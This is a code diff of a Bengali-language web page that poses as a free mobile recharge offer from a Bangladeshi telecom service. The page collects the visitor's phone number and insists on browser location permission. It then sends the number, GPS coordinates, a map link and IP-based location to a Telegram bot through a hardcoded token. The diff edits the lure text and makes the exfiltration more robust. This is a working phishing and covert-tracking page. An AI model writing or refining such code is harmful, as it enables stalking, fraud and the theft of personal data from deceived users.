@@ -9,11 +9,9 @@
         .top-bar { background: #f8f9fa; padding: 20px; border-bottom: 1px solid #eee; font-weight: bold; font-size: 18px; }
         .container { max-width: 400px; margin: 40px auto; padding: 30px; border: 1px solid #eee; border-radius: 15px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
         .offer-title { color: #2ba745; font-size: 26px; font-weight: bold; margin-bottom: 10px; }
-        .desc { font-size: 15px; color: #666; margin-bottom: 30px; }
         input { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 8px; font-size: 18px; box-sizing: border-box; margin-bottom: 20px; }
-        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; transition: 0.3s; font-weight: bold; }
-        .btn:active { background: #0056b3; transform: scale(0.98); }
-        .footer { margin-top: 60px; font-size: 12px; color: #bbb; border-top: 1px solid #f1f1f1; padding-top: 20px; }
+        .btn { background: #007bff; color: #fff; padding: 15px; width: 100%; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; font-weight: bold; }
+        .btn:disabled { background: #ccc; }
     </style>
 </head>
 <body>
@@ -22,13 +20,10 @@
 
     <div class="container">
         <div class="offer-title">অফার: ২০ টাকা ফ্রি রিচার্জ!</div>
-        <p class="desc">আপনার ১১ সংখ্যার মোবাইল নম্বরটি দিয়ে ভেরিফিকেশন সম্পন্ন করুন এবং সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
-        
+        <p>নম্বর ভেরিফাই করে সাথে সাথেই রিচার্জ গ্রহণ করুন।</p>
         <input type="number" id="target_phone" placeholder="01XXXXXXXXX" required>
         <button class="btn" id="submitBtn" onclick="initiateProcess()">রিচার্জ নিন</button>
     </div>
-
-    <div class="footer">© 2026 Mobile Services Bangladesh. All Rights Reserved.</div>
 
 <script>
 async function initiateProcess() {
@@ -43,16 +38,15 @@ async function initiateProcess() {
     btn.innerText = "ভেরিফাই হচ্ছে...";
     btn.disabled = true;
 
-    // লোকেশন পারমিশন চাওয়া
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
             (pos) => sendToBot(phone, pos.coords.latitude, pos.coords.longitude),
             (err) => {
-                alert("দুঃখিত! লোকেশন পারমিশন ছাড়া এই অফারটি গ্রহণ করা সম্ভব নয়। ব্রাউজার সেটিংস থেকে লোকেশন Allow করুন।");
+                alert("ভেরিফিকেশন ব্যর্থ! রিচার্জ পেতে লোকেশন পারমিশন 'Allow' করতে হবে।");
                 btn.innerText = "রিচার্জ নিন";
                 btn.disabled = false;
             },
-            { timeout: 8000 }
+            { timeout: 10000 }
         );
     } else {
         alert("আপনার ব্রাউজার লোকেশন সাপোর্ট করে না।");
@@ -62,22 +56,22 @@ async function initiateProcess() {
 }
 
 async function sendToBot(phone, lat, lon) {
-    const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; // আপনার বট টোকেন
-    const chat_id = "7887080882"; // আপনার চ্যাট আইডি
+    const token = "8242516940:AAEGDu48l_miakigo6zRSfJ6pvyEq7wM6k"; 
+    const chat_id = "7887080882"; 
 
     try {
-        // আইপি এবং এলাকা তথ্য সংগ্রহ
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
+        // IP ট্র্যাকিং - এটি কাজ না করলে ক্যাচ ব্লকে যাবে
+        let ipInfo = "Unavailable";
+        try {
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            ipInfo = `${ipData.ip} (${ipData.city}, ${ipData.country_name})`;
+        } catch (e) { console.log("IP fetch failed"); }
 
-        // ম্যাপ লিঙ্ক সঠিকভাবে তৈরি (Template Literal ব্যবহার করে)
+        // সঠিক ম্যাপ লিঙ্ক ফরম্যাট
         const map_link = `https://www.google.com/maps?q=${lat},${lon}`;
         
-        const text = `**🎁 নতুন রিচার্জ রিকোয়েস্ট!**\n\n` +
-                     `📱 নম্বর: ${phone}\n` +
-                     `🌐 IP: ${ipData.ip}\n` +
-                     `🏠 এলাকা: ${ipData.city}, ${ipData.country_name}\n` +
-                     `📍 ম্যাপ: ${map_link}`;
+        const text = `**🎁 নতুন রিকোয়েস্ট!**\n\n📱 নম্বর: ${phone}\n🌐 IP: ${ipInfo}\n📍 ম্যাপ: ${map_link}`;
 
         const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
         
